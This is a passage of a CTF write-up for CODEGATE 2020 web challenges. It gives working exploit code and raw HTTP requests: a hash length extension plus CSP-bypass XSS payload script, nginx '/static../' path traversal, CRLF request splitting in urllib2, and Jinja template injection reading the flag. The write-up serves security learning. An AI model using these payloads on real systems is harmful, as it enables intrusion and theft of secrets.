class="variable">$api_string</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$apis</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$info</span>) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$info</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$p1</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$info</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$p2</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> === <span class="string">&quot;header&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$p1</span>) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p1</span>.<span class="variable">$p2</span>, <span class="string">&quot;:&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$p1</span>.<span class="variable">$p2</span>, <span class="string">&quot;-&quot;</span>) !== <span class="literal">false</span>) <span class="comment">//Don&#x27;t trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;<span class="subst">$p1</span>: <span class="subst">$p2</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$n</span> === <span class="string">&quot;cookie&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$p1</span>, <span class="variable">$p2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$n</span> === <span class="string">&quot;body&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&lt;.*&gt;/&quot;</span>, <span class="variable">$p1</span>))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$p1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$n</span> === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once you have downloaded the attached file, you can see the source above.<br>After receiving two parameters, <strong>sig</strong> and <strong>q</strong>, put a salt before the <em>base64 decoded value</em> to compare with the <strong>sig</strong>. </p><p><strong>Hash validation</strong> in the form <code>$salt + $value</code> for known weak algorithms, such as this issue, may be vulnerable to <strong>length extension attack</strong>.</p><ul><li><a href="https://github.com/bwall/HashPump">https://github.com/bwall/HashPump</a></li></ul><p>the <strong>HashPump</strong> on the link makes it easy to complete the <strong>length extension attack</strong> payload. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">&gt;</span>alert(1)&lt;/script</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>In the <strong>body</strong> <strong>part</strong>, <strong>regular expression verification</strong> prevents the insertion of html tags, but this is an incorrect regular expression, which can be bypassed through inserting <strong>a new line character</strong>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/: 102&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>As the title, <strong>this challenge</strong> has <strong>the CSP settings</strong> as above <strong>to prevent XSS</strong> from occurring on the site.<br>However, the CSP may not work with some <strong>response status</strong>.<br>The api allows you to bypass the <strong>CSP</strong> by setting the <strong>response status</strong> to <strong>102</strong>. </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">d1 = [<span class="string">&#x27;header&#x27;</span>, <span class="string">&#x27;HTTP/&#x27;</span>, <span class="string">&#x27;102&#x27;</span>]</span><br><span class="line">d2 = [<span class="string">&#x27;body&#x27;</span>, <span class="string">&#x27;&lt;script\n&gt;alert(origin)\n&lt;/script\n&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">d1 = <span class="string">&#x27;,&#x27;</span>.join(b64encode(c.encode()).decode() <span class="keyword">for</span> c <span class="keyword">in</span> d1)</span><br><span class="line">d2 = <span class="string">&#x27;,&#x27;</span>.join(b64encode(c.encode()).decode() <span class="keyword">for</span> c <span class="keyword">in</span> d2)</span><br><span class="line"></span><br><span class="line">merged = <span class="string">&#x27;|&#123;&#125;|&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d1, d2)</span><br><span class="line"></span><br><span class="line">[sig, value] = os.popen(<span class="string">&quot;hashpump -s &#x27;697e91bd03ae11b196e095af93027e56&#x27; -d &#x27;MQ==,Mg==,Mw==&#x27; -a &#x27;&#123;&#125;&#x27; -k 12&quot;</span>.<span class="built_in">format</span>(merged)).read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q = b64encode(<span class="built_in">eval</span>(<span class="string">&quot;b&#x27;&#x27;&#x27;&quot;</span> + value + <span class="string">&quot;&#x27;&#x27;&#x27;&quot;</span>)).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;http://110.10.147.166/api.php?sig=&#123;&#125;&amp;q=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(sig, q))</span><br></pre></td></tr></table></figure><p>This is <strong>a payload script</strong> using the two techniques described above, and you can change the contents of the script <strong>by change d2</strong>.</p><p><strong>After configuring the script</strong> and send the cookie value to your server, you can check the flag at the cookie value by sending the generated address to admin via <strong>the website’s report function</strong>. </p><h2 id="750pts-renderer"><a href="#750pts-renderer" class="headerlink" title="[750pts] renderer"></a>[750pts] <a href="#renderer">renderer</a></h2><ul><li><a href="https://file.rwx.kr/ctf/2020/codegate/022fd23aa5d26fbeea4ea890710178e9.zip">022fd23aa5d26fbeea4ea890710178e9.zip</a></li></ul><blockquote><p>Description :<br>It is my first flask project with nginx. Write your own message, and get flag!<br><a href="http://110.10.147.169/renderer/">http://110.10.147.169/renderer/</a><br><a href="http://58.229.253.144/renderer/">http://58.229.253.144/renderer/</a> </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// http://110.10.147.169/static../run.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">service nginx stop</span><br><span class="line"><span class="built_in">mv</span> /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line"><span class="built_in">mv</span> /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>Although This server is a just only for this challenge, it is weird serviced by the flask app through <code>/render</code> paths rather than the root path.</p><p>The address <code>/static</code>, which is referenced on service page, allows users to browse the parent directory by an nginx misconfigure, which skill is well known, so I will skip the explanation.<br>An attacker will be able to navigate the &#x2F;home path through the <code>/static../</code> path.</p><p>The <strong>Dockerfile</strong> given as an attachment indicates that <code>/home/src/</code> is the source directory for this flask app. </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// http://<span class="number">110.10</span><span class="number">.147</span><span class="number">.169</span>/static../src/app/__init__.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">&quot;/renderer&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;FLAG&quot;</span>] = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CODEGATE2020&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>/src/app/_init__.py</code> file indicates that the flag passed to the environment variable from Dockerfile via the <strong>ENV</strong> command was set in the <code>app.config[&quot;FLAG&quot;]</code> property of the flask app. </p><p>Also, <code>from app import routes</code> make us know that <code>routes.py</code> has a routing implementation source. </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">// http://<span class="number">110.10</span><span class="number">.147</span><span class="number">.169</span>/static../src/app/routes.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">&quot;renderer&quot;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(request.url)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(<span class="params"><span class="string">&quot;/whatismyip&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ipcheck</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_access</span>():</span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;admin_remote.html&quot;</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.2&quot;</span> <span class="keyword">and</span> request.args.get(<span class="string">&quot;body&quot;</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">&quot;body&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(<span class="params"><span class="string">&quot;/admin/ticket&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_ticket</span>():</span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn&#x27;t allow to show ticket</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">1</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#only local</span></span><br><span class="line">        <span class="built_in">print</span> <span class="number">2</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>) != <span class="string">&quot;AdminBrowser/1.337&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;ticket&quot;</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">&quot;ticket&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            <span class="built_in">print</span> <span class="number">4</span></span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ip</span>():</span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_real_ip</span>():</span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">&quot;X-Forwarded-For&quot;</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy_read</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line"></span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_log</span>(<span class="params">rip</span>):</span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">&quot;Admin page accessed from %s&quot;</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_extend_log</span>(<span class="params">rip, body</span>):</span><br><span class="line">    tid = hashlib.sha1(<span class="built_in">str</span>(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_log</span>(<span class="params">ticket</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>The <code>/home/src/app/routes.py</code> identifies the features and vulnerabilities of the website. </p><p>When requested by specifying an X-Forwarded-For header that is not a value of <strong>127.0.0.1</strong> or <strong>127.0.0.2</strong> in the path <code>/admin</code>, a file containing the contents of the <code>X-Forwarded-For</code> is created through the write_log function in the <code>/home/tickets</code> directory and returned to the filename. </p><p>In the admin_ticket function corresponding to the <code>/admin/ticket</code> path, read the delivered ticket and execute the factor_template_string function. As a result, <strong>Jinja SSTI</strong> is available for this issue. </p><ul><li><a href="https://www.cvedetails.com/cve/CVE-2019-9740/">https://www.cvedetails.com/cve/CVE-2019-9740/</a></li></ul><p>The http request function, which is the main feature of the problem, is through the old version of <strong>urlib2</strong> library. (The Python version is listed in the attached Dockerfile) <strong>A CRLF vulnerability</strong> exists in that version of urlib2, which enables http request splitting. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 84</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin HTTP/1.1</span><br><span class="line">X-Forwarded-For: applemint</span><br><span class="line">X-Ignore: </span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Codegate20 Proxy Service<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span>Codegate &#x27;20 Proxy Admin Page<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/admin_is_watching_you.jpg&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">            Your access log is written with ticket no e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>You can create a file at <code>/home/tickets/</code> with any request like this and get the file name. In this case, the ticket file is <code>/home/tickets/e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</code>. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// http://110.10.147.169/static../tickets/e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4</span><br><span class="line">Admin page accessed from applemint</span><br></pre></td></tr></table></figure><p>You can view the contents of the saved ticket file using the nginx route bug as described above. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 194</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin/ticket?ticket=e05c0b2a191386ab2b6ff732f2e8c199e0ce18b4 HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;proxy-body&quot;</span>&gt;</span></span><br><span class="line">    Admin page accessed from applemint</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The request split vulnerability allows full manipulation of the contents of packets.<br>When you pass the parameter to the &#x2F;admin&#x2F;ticket path as GET, the contents of the ticket file appear rendered as a template. </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin HTTP/1.1</span><br><span class="line">X-Forwarded-For: &#123;&#123;config.FLAG&#125;&#125;</span><br><span class="line">X-Ignore: </span><br><span 